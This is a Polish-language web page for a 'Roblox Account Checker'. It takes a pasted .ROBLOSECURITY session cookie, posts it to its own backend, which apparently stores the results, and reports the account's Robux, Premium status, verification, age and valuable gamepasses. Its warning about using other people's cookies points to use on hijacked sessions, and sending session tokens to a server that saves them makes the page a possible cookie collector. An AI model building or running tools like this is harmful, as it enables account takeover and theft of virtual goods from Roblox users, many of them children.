<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Roblox Checker</title>
  <style>
    body { font-family: Arial, sans-serif; max-width: 620px; margin: 40px auto; padding: 20px; background: #0d1117; color: #e6edf3; }
    textarea { width: 100%; height: 160px; background: #161b22; color: #e6edf3; border: 1px solid #30363d; padding: 12px; font-family: monospace; resize: vertical; border-radius: 6px; }
    button { padding: 14px 40px; background: #238636; border: none; color: white; font-size: 17px; cursor: pointer; margin: 20px 0; border-radius: 6px; font-weight: bold; }
    button:hover { background: #2ea043; }
    #result { margin-top: 30px; padding: 20px; background: #161b22; border: 1px solid #30363d; border-radius: 8px; min-height: 200px; line-height: 1.55; }
    .error { color: #f85149; } .success { color: #3fb950; } b { color: #c9d1d9; } small { color: #8b949e; }
    #avatar { max-width: 100%; height: auto; border-radius: 12px; margin: 15px 0; border: 2px solid #30363d; display: block; }
  </style>
</head>
<body>

<h2>Roblox Account Checker</h2>

<p style="color:#f0b429; font-weight:bold;">
  <strong>UWAGA:</strong> Używanie cudzego .ROBLOSECURITY narusza regulamin Roblox i kończy się permanent banem.
</p>

<textarea id="cookie" placeholder="Wklej samą wartość .ROBLOSECURITY (bez prefiksu '.ROBLOSECURITY=')"></textarea>
<br>
<button onclick="checkAccount()">Sprawdź</button>

<div id="result"></div>

<script>
async function checkAccount() {
  const cookieVal = document.getElementById('cookie').value.trim();
  const resultDiv = document.getElementById('result');
  resultDiv.innerHTML = '';

  if (cookieVal.length < 180) {
    resultDiv.innerHTML = '<span class="error">Cookie za krótki / wygląda na nieprawidłowy</span>';
    return;
  }

  resultDiv.innerHTML = '<i>Trwa sprawdzanie konta... chwilę...</i>';

  try {
    const response = await fetch('/api/get-username', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cookie: cookieVal })
    });

    const data = await response.json();

    if (!response.ok || data.error) {
      resultDiv.innerHTML = `<span class="error">Błąd: ${data.error || 'Nieznany problem'}</span>`;
      return;
    }

    const d = data;

    const creationDate = d.created && d.created !== 'failed'
      ? new Date(d.created).toLocaleDateString('pl-PL', { month: 'long', day: 'numeric', year: 'numeric' })
      : '—';

    const avatarHtml = d.avatarUrl
      ? `<img id="avatar" src="${d.avatarUrl}" alt="Avatar" onerror="this.style.display='none'">`
      : '<p style="color:#f0b429;">Brak avatara</p>';

    const mm2 = [429957, 1308795].filter(id => d.gamepasses?.includes(id)).length;
    const amp = [189425850,951065968,951441773,6408694,60406961585546290,7124470,6965379,3196348,5300198].filter(id => d.gamepasses?.includes(id)).length;
    const sab = [1227013099,1229510262,1228591447].filter(id => d.gamepasses?.includes(id)).length;

    resultDiv.innerHTML = `
      <span class="success">✓ Konto sprawdzone</span><br><br>
      ${avatarHtml}
      <b>Nick:</b> ${d.username}<br>
      <b>Display:</b> ${d.displayName}<br>
      <b>ID:</b> ${d.userId}<br>
      <b>Premium:</b> <span style="color:${d.premium?'#3fb950':'#f85149'}">${d.premium ? 'TAK' : 'NIE'}</span><br>
      <b>Email/Telefon:</b> <span style="color:${d.emailVerified?'#3fb950':'#f85149'}">${d.emailVerified ? 'TAK' : 'NIE'}</span><br>
      <b>Robux:</b> <span style="color:#f0b429">${d.robux.toLocaleString('pl-PL')}</span><br>
      <b>MM2 gp:</b> ${mm2}<br>
      <b>AMP gp:</b> ${amp}<br>
      <b>SAB gp:</b> ${sab}<br>
      <b>Wiek:</b> ${d.ageDays} dni (${creationDate})<br>
      <br><small style="color:#444;">Wynik został zapisany.</small>
    `;
  } catch (err) {
    resultDiv.innerHTML = `<span class="error">Błąd połączenia: ${err.message}</span>`;
  }
}
</script>
</body>
</html>
